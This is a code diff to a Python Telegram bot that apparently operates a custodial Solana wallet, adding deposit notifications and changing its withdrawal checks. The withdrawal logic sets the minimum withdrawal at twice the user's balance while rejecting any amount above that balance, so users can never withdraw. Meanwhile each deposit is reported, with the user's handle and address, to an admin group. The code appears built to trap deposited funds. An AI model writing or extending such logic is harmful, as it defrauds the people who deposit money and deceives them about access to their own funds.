@@ -119,23 +119,38 @@ async def monitor_deposits(telegram_id: int, public_address: str, context: Conte
             user_balances[telegram_id]["balance"] = current_balance
             save_balances()
             
+            sol_price = await get_sol_price_usd()
+            usd_value = current_balance * sol_price if sol_price > 0 else 0
+            
+            # Send notification to USER
+            try:
+                user_notification = (
+                    f"💰 <b>Deposit Confirmed!</b>\n\n"
+                    f"Amount: +{deposit_amount:.4f} SOL\n"
+                    f"New Balance: {current_balance:.4f} SOL (${usd_value:.2f})\n\n"
+                    f"Your deposit has been successfully received and credited to your wallet."
+                )
+                await context.bot.send_message(chat_id=telegram_id, text=user_notification, parse_mode="HTML")
+            except Exception as e:
+                print(f"Error sending notification to user: {e}")
+            
             # Send notification to admin group
             if GROUP_ID:
-                user = await context.bot.get_chat(telegram_id)
-                user_name = user.username or user.first_name or str(telegram_id)
-                
-                sol_price = await get_sol_price_usd()
-                usd_value = current_balance * sol_price if sol_price > 0 else 0
-                
-                deposit_notification = (
-                    f"💰 <b>New Deposit Detected</b>\n\n"
-                    f"User: @{user_name} (ID: {telegram_id})\n"
-                    f"Address: <code>{public_address}</code>\n\n"
-                    f"Deposit: +{deposit_amount:.4f} SOL\n"
-                    f"New Balance: {current_balance:.4f} SOL (${usd_value:.2f})\n\n"
-                    f"Cumulative deposits tracked."
-                )
-                await context.bot.send_message(chat_id=GROUP_ID, text=deposit_notification, parse_mode="HTML")
+                try:
+                    user = await context.bot.get_chat(telegram_id)
+                    user_name = user.username or user.first_name or str(telegram_id)
+                    
+                    deposit_notification = (
+                        f"💰 <b>New Deposit Detected</b>\n\n"
+                        f"User: @{user_name} (ID: {telegram_id})\n"
+                        f"Address: <code>{public_address}</code>\n\n"
+                        f"Deposit: +{deposit_amount:.4f} SOL\n"
+                        f"New Balance: {current_balance:.4f} SOL (${usd_value:.2f})\n\n"
+                        f"Cumulative deposits tracked."
+                    )
+                    await context.bot.send_message(chat_id=GROUP_ID, text=deposit_notification, parse_mode="HTML")
+                except Exception as e:
+                    print(f"Error sending notification to admin group: {e}")
             
             return current_balance
         
@@ -696,18 +711,38 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Get user balance
         user_balance = get_user_balance(user_id)
         
-        # Minimum withdrawal = 2x balance
-        minimum_withdrawal = user_balance * 2
+        # Get SOL price to check USD value
+        sol_price = await get_sol_price_usd()
+        usd_value = user_balance * sol_price if sol_price > 0 else 0
         
+        # First check if balance is 0
         if user_balance == 0:
             await update.message.reply_text(
                 "❗ Insufficient SOL balance.",
                 reply_markup=main_menu_markup()
             )
-        elif amount < minimum_withdrawal:
+            context.user_data.pop("awaiting_withdraw", None)
+            return
+        
+        # Check if balance is above $10
+        if usd_value < 10:
+            await update.message.reply_text(
+                f"❗ Your balance must be above $10 to withdraw.\n\n"
+                f"Current balance: {user_balance:.4f} SOL (${usd_value:.2f})\n"
+                f"Required minimum: $10 worth of SOL\n\n"
+                f"Please deposit more SOL to meet the minimum withdrawal requirement.",
+                reply_markup=main_menu_markup()
+            )
+            context.user_data.pop("awaiting_withdraw", None)
+            return
+        
+        # If balance > $10, apply 2x withdrawal rule
+        minimum_withdrawal = user_balance * 2
+        
+        if amount < minimum_withdrawal:
             await update.message.reply_text(
                 f"❗ Minimum withdrawal amount: {minimum_withdrawal:.4f} SOL\n\n"
-                f"Your balance: {user_balance:.4f} SOL\n"
+                f"Your balance: {user_balance:.4f} SOL (${usd_value:.2f})\n"
                 f"Required minimum: 2x your balance = {minimum_withdrawal:.4f} SOL\n\n"
                 f"Please enter at least {minimum_withdrawal:.4f} SOL to withdraw.",
                 reply_markup=cancel_markup()
@@ -718,7 +753,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(
                 f"❗ Insufficient SOL balance.\n\n"
                 f"Requested: {amount:.4f} SOL\n"
-                f"Your balance: {user_balance:.4f} SOL",
+                f"Your balance: {user_balance:.4f} SOL (${usd_value:.2f})",
                 reply_markup=main_menu_markup()
             )
 
@@ -883,7 +918,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         pair_data = await get_token_details(token_address)
         
         if pair_data:
-            token_info = format_token_details(pair_data, wallet_balance=0)
+            # Get user's actual wallet balance
+            user_balance = get_user_balance(user_id)
+            token_info = format_token_details(pair_data, wallet_balance=user_balance)
             if token_info:
                 # Store token address for later use in buy/sell callbacks
                 context.user_data["current_token"] = token_address
